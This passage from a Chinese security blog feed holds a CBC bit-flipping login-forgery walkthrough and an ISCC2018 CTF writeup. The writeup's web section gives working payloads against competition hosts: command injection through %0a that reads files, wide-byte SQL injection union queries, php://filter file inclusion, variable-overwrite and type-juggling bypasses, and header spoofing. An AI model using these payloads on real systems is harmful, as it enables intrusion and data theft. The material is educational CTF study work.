$random_iv;}</code></pre><p>首先随机生成了一个16位的iv；<br>然后从</p><pre><code>$info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);</code></pre><p>和</p><pre><code>function login($info){    $iv = get_random_iv();    $plain = serialize($info);    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];    setcookie(&quot;iv&quot;, base64_encode($iv));    setcookie(&quot;cipher&quot;, base64_encode($cipher));}</code></pre><p>可见，对传入的账号和密码进行序列化，作为明文，然后对其进行AES加密，其中使用到了随机生成的iv<br>后将加密后的内容进行base64编码，放入cookie中。</p><pre><code>function check_login(){    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))    {        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))        {            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];        }        else        {            die(&quot;ERROR!&quot;);        }    }}</code></pre><p>然后再对传入的cookie中的密文解密，然后对明文就行反序列化（如果反序列化失败就打印出明文的base64编码），后把反序列化后的明文，即Info中的username还给username，最后进行判定:</p><pre><code>function show_homepage(){    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;){        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;    }else{        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;    }    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;}</code></pre><p>如果用户名是admin，就给出flag，否则不给，但值得一提的是：</p><pre><code>if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;])){    $username = (string)$_POST[&#39;username&#39;];    $password = (string)$_POST[&#39;password&#39;];    if($username === &#39;admin&#39;)    {        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);    }    else    {        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);        login($info);        show_homepage();    }}</code></pre><p>登录时做出了限制，如果用admin登录是显然不行的。<br>所以这时就需要CBC字节翻转攻击来实现了<br>登录时：可以使用</p><pre><code>username=1dmin;password=Bigbroke;</code></pre><p>此时我们要做的就是把1dmin通过翻转攻击，把’1‘变成‘a’，即可变成admin登录成功得到Flag<br>首先按照步骤：将我们传入的Info进行序列化，得到明文：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Bigbroke&quot;;}</code><br>然后对其进行分组：</p><pre><code>block 1 : a:2:{s:8:&quot;usernablock 2 : me&quot;;s:5:&quot;1dmin&quot;;block 3 : s:8:&quot;password&quot;;sblock 4 : :5:&quot;Bigbroke&quot;;}</code></pre><p>我们所要改变的即block 2中的偏移量为9的那个明文，即1<br>所以按照攻击方式，应该改变block 1中有相同偏移量的那个密文，即偏移量为9的值<br>所以得到以下公式：<br>cipher = cipher[:9] + chr(ord(cipher[9]) ^ ord(‘1’) ^ ord(‘a’)) + cipher[10:]<br>故可将1dmin变成admin，但有一点需要注意，这样改变后，密文的值发生了改变，将其进行解密后反序列化，是会失败的，从而会把无法反序列化的明文打印出来（因为我们对block 1进行了改变，虽然block 2变成了我们所希望的值，但block 1却变成了未知的量）<br>所以此时，需要改变iv的值来改变block 1的值<br>（注：这就是cbc的处理方式，iv的值改变block1的值，block1的值改变block2的值……）<br>故此，我们需要一个正确的Iv，使block 1依旧为<code>a:2:{s:8:&quot;userna</code><br>故此得到第二个公式：（plain为无法反序列化打印出来的被base64编码的明文）</p><pre><code>want = &#39;a:2:{s:8:&quot;userna&#39;first_16 = &#39;&#39;iv = base64.b64decode(&#39;你一开始随机生成的被base64编码过的iv&#39;)for i in range(16):    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))newiv = first_16</code></pre><p>这样就可以将密文前16位的值，即block 1的明文变成我们想要的<code>a:2:{s:8:&quot;userna</code><br>故此即plain伪造成功，此时的plain是绝对可以被反序列化的<br>最后，我们将伪造的密文和伪造的iv传入cookie，即可被解密还原成我们伪造的plain<br>即：<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;1dmin&quot;;s:8:&quot;password&quot;;s:5:&quot;Bigbroke&quot;;}</code><br>变成了<br><code>a:2:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;Bigbroke&quot;;}</code><br>最后即可以admin的身份成功登入网站，拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ISCC2018-writeup</title>
      <link href="/archis/4e1d9865/"/>
      <url>/archis/4e1d9865/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>winhex打开修改高度</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011954_574.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011955_458.png" alt=""></p><p>_Welcome_To_ISCC<em>2018</em></p><h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>69742773206561737921 </p><p>16进制转文本 </p><p>给个在线网站</p><p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171116_151.png" alt=""></p><h3 id="秘密电报："><a href="#秘密电报：" class="headerlink" title="秘密电报："></a>秘密电报：</h3><p>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</p><p>在线培根密码解密</p><p><a href="http://tool.ph0en1x.com/bacon/" target="_blank" rel="external">http://tool.ph0en1x.com/bacon/</a></p><p>ILIKEISCC</p><h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>base64解密，</p><p>在线解密<a href="https://base64.supfree.net/" target="_blank" rel="external">https://base64.supfree.net/</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171406_511.png" alt=""></p><p>解密到这里不行了</p><p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=  </p><p>然后再用aes解密 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171412_741.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171413_518.png" alt=""></p><p>把我复制走</p><h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>把图片放进WinHex中观察 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171511_899.png" alt=""></p><p>末尾有很多Unicode</p><p>Unicode转ascii</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171423_933.png" alt=""></p><p>unicode转中文</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171425_238.png" alt=""></p><p>flag{iscc is fun}</p><h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>TweakPNG打开 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171430_847.png" alt=""></p><p>Adobe Fireworks CS5 处理 </p><p>图层隐层</p><p>拼接一下</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171502_356.png" alt=""></p><h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒密码，并且偏移是13</p><p>得到<code>roqtp697t95j3</code>，一看就不是flag，结合提示<code>键盘</code>，所以可能是键盘密码: 即密文在键盘上的下一行所对应的字符是相应明文，</p><h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>winhex打开会发现这个是jpg文件，有文件头，但是没有文件尾，搜索之后就会得到文件尾FFD9所在的位置，需要把FFD9后面的十六进制转化为一个新的文件，并且要以（.doc）格式保存  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171528_660.png" alt=""></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a> </p><p>佛曰密码解</p><p>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</p><p>十六进制转换了，转换为字符串：  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171532_778.png" alt=""></p><p>base64解密：  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171557_687.png" alt=""></p><p>base32：  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171615_371.png" alt=""></p><p>十六进制转化： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171616_86.png" alt=""></p><p>base64解密：  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171617_526.png" alt=""></p><p>base32：  </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171618_95.png" alt=""></p><p>十六进制转化 </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171619_254.png" alt=""></p><p>F1a9_is_I5cc_ZOl8_G3TP01NT</p><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途</p><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7） </p><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码 </p><h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>伪加密修改的几种方法</p><blockquote><p>1、在Mac OS以及部分linux（Kali）系统中，可以直接打开伪加密的ZIP压缩包。</p><p>2、使用检测伪加密的工具ZipCenOp.jar，解密后如果能成功打开ZIP包，则是伪加密，否则说明思路错误。</p><p>3、使用16进制编辑器更改加密标志位。</p></blockquote><p>打开压缩包之后发现需要解压密码</p><p>既然已经知道是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p><pre><code>java -jar ZipCenOp.jar r ISCC-MISC02.zip</code></pre><p>vfppjrnerpbzvat </p><p>rot13 解码</p><p>得到isccwearecoming</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805012218_803.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805012227_276.png" alt=""></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>f12查看 本地长度绕过修改maxlength=4</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031858_254.png" alt=""></p><p>输入99999999提交</p><p>得key is 768HKyu678567&amp;*&amp;K</p><h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071904_900.png" alt=""></p><pre><code>&lt;?php highlight_file(&#39;2.php&#39;); $flag=&#39;{***************}&#39;; if (isset($_GET[&#39;password&#39;])) {       if (strcmp($_GET[&#39;password&#39;], $flag) == 0)   ////如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写）         die(&#39;Flag: &#39;.$flag);       else           print &#39;Invalid password&#39;;   }   ?&gt;</code></pre><p><a href="http://118.190.152.202:8003?password[]=1" target="_blank" rel="external">http://118.190.152.202:8003?password[]=1</a></p><p>ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} </p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>查看源码ISCC{^&amp;*(UIHKJjkadshf}</p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>题目</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031853_626.png" alt=""></p><p>%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_</p><p>base64解码</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031853_539.png" alt=""></p><p>flag{Hell0World}</p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>好像有个文件忘记删了</p><p>考察源码泄露</p><p>py脚本得到<a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt</a></p><p>所以进入得到如下代码</p><pre><code class="php">&lt;?phpinclude &quot;flag.php&quot;;if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)    die(&quot;flag is here&quot;);if (!isset($_POST[&quot;flag&quot;])     die($_403);foreach ($_GET as $k =&gt; $v){     $$k = $$v;//$k=200 $$k=$_200    所以$_200 = &amp;flag}foreach ($_POST as $k =&gt; $v){    $$k = $v; //$flag =2333}if ( $_POST[&quot;flag&quot;] !== $flag )    die($_403);echo &quot;flag: &quot;. $flag . &quot;\n&quot;;die($_200);?&gt;</code></pre><blockquote><h5 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h5><p>(PHP 4, PHP 5, PHP 7)</p><p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p><pre><code>foreach (array_expression as $value)    statementforeach (array_expression as $key =&gt; $value)    statement</code></pre><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p><p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p></blockquote><p><a href="http://www.cleey.com/blog/single/id/841.html" target="_blank" rel="external">深入解析php中的foreach问题</a></p><p>题目中使用了两个foreach并且也使用了’&amp;&amp;’,两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p><p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中又把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。</p><p>payload:</p><pre><code>index.php?_200=flagPOST:flag=1</code></pre><p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。</p><p>payload2:</p><pre><code>index.php?_403=flag&amp;_POST=1POST:flag=</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805070015_872.png" alt=""></p><p>ISCC{taolu2333333….} </p><h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>打开地址随便点文章，一开始可能以为是sql注入</p><p>但仔细看会发现?f=articles可能是存在文件包含漏洞</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071843_315.png" alt=""></p><p>但是这里有个坑，题目说</p><blockquote><p>你能绕过吗?</p><p>没过滤好啊</p></blockquote><p>因为考察文件包含漏洞所以很有可能过滤php filter协议，尝试大写Php发现绕过成功</p><p><a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="external">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071842_517.png" alt=""></p><p>得到base64源码。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071842_242.png" alt=""></p><p>ISCC{LFIOOOOOOOOOOOOOO}</p><h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><a href="http://118.190.152.202:8004/" target="_blank" rel="external">http://118.190.152.202:8004/</a></p><p>一开始尝试X-Forwarded-For: 127.0.0.1不行</p><blockquote><pre><code>X-Forwarded-For: 127.0.0.1Contact: 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Client-IP: 127.0.0.1Referer: 127.0.0.1From: 127.0.0.1X-Wap-Profile: 127.0.0.1True-Client-IP: 127.0.0.1Client-IP: 127.0.0.1</code></pre></blockquote><p>后来尝试Client-IP: 127.0.0.1</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805021340_915.png" alt=""></p><p>ISCC{iscc_059eeb8c0c33eb62}</p><h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>万万没想到直接在get方式下命令执行，过滤| 使用%0a绕过</p><p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p><p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p><pre><code> &#39;&#39;,        &#39;;&#39; =&gt; &#39;&#39;,        &#39;|&#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );    }    echo  &quot;{$cmd}&quot;;?&gt;</code></pre><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080036_137.png" alt=""></p><p>一个一个试查看flag在哪里 发现flag在/home/flag</p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080045_61.png" alt=""></p><p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p><pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}</code></pre><p>Reference：</p><p><a href="http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a></p><p>方法二:</p><p> 使用扫描器，扫描一下目录。如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/834add0a-fcb1-4893-bd20-de7ff3e922d4.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> 扫描结果：<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="external">http://118.190.152.202:8018/flag.txt</a> （3） 打开扫描结果，如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/afd1056b-c0f7-4735-aff0-2cf288df693f.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> </p><h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805170015_39.png" alt=""></p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;])){     $username = $_POST[&#39;username&#39;];     $password = $_POST[&#39;password&#39;]; } else{     $username=&quot;hello&quot;;     $password=&quot;hello&quot;; } if(md5($password) == 0){     echo &quot;xxxxx&quot;; } show_source(__FILE__); ?&gt;</code></pre><p>md5</p><p>password=240610708</p><p>跳转</p><pre><code class="php">&lt;?php include &#39;flag.php&#39;; $a = @$_REQUEST[&#39;a&#39;]; @eval(&quot;var_dump($$a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>$$a 这个东西很诡异。其实就是php中变量可以当作另一个变量的变量名 </p><p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p><p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p><p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p><p>这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下： </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805170011_680.png" alt=""></p><p> 所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload： </p><p><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="external">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a></p><p>ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} </p><h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>在url传参username和password得到界面提示有index.php.txt文件</p><p>所以访问<a href="http://118.190.152.202:8017/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8017/index.php.txt</a></p><p>得到源码</p><pre><code>&lt;?phperror_reporting(0);$flag = &quot;***********&quot;;    if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;    }    else{    print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;}}elseprint &#39;Please give me username or password!&#39;;if (isset($_GET[&#39;password&#39;])){    if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;            print &#39;&lt;p&gt;very good!Password is right&lt;/p&gt;&#39;;        }else             print &#39;&lt;p&gt;Password too little&lt;/p&gt;&#39;;        }else        print &#39;&lt;p&gt;Password too long&lt;/p&gt;&#39;;    }else    print &#39;&lt;p&gt;Password is not numeric&lt;/p&gt;&#39;;}if ($a.$b == &quot;flag&quot;)    print $flag;?&gt;</code></pre><p>分析</p><pre><code>if(isset($_GET[&#39;username&#39;])){    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){    $a = fla;    echo &quot;very good!Username is right&quot;;</code></pre><blockquote><p>strcasecmp(string1,string2)</p><p> 参数 str1第一个字符串。str2第二个字符串。</p><p>如果 str1 小于 str2 返回 &lt; 0；</p><p> 如果 str1 大于 str2 返回 &gt; 0；</p><p>如果两者相等，返回 0。 </p></blockquote><p>可以使用username数组绕过</p><pre><code>if (is_numeric($_GET[&#39;password&#39;])){        if (strlen($_GET[&#39;password&#39;]) &lt; 4){            if ($_GET[&#39;password&#39;] &gt; 999){            $b = g;</code></pre><p>必须通过3位数字，但大于999</p><p><a href="http://52.10.107.64:8002/?password=4e3" target="_blank" rel="external">?password=4e3</a> </p><p><a href="http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3" target="_blank" rel="external">http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3</a> </p><p>flag{ISCC2018_Very_GOOD!} </p><p>Reference：</p><p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md</a></p><h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>注入点:个人信息栏</p><p>发现页面编码是gb2312，可能是宽字节注入，检验一下<code>id=1%df&#39;--+</code>，返回正常页面，确定是宽字节注入 </p><pre><code>id=1%df&#39; or 1=1  order by 8--+  id=1%df&#39; or 1=1  order by 9--+id=-1%df&#39; union select 1,2,3,4,5,6,7,8--+    id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(table_name),8 from information_schema.tables where table_schema = database() --+  id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(column_name),8 from information_schema.columns where table_name = 0x61646d696e73 --+ id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(flag),8 from admins --+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080049_453.png" alt=""></p><p> Flag：Y0u_@<a href="https://github.com/33w_dxxmn_9rf0Od" target="_blank" rel="external">@33w_dxxmn_9rf0Od</a> </p><h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php</a></p><p>打开题目</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140857_654.png" alt=""></p><p>查看源码<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140858_867.png" alt=""></p><p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140901_199.png" alt=""></p><p>大概可以猜测 文件包含漏洞，尝试</p><pre><code 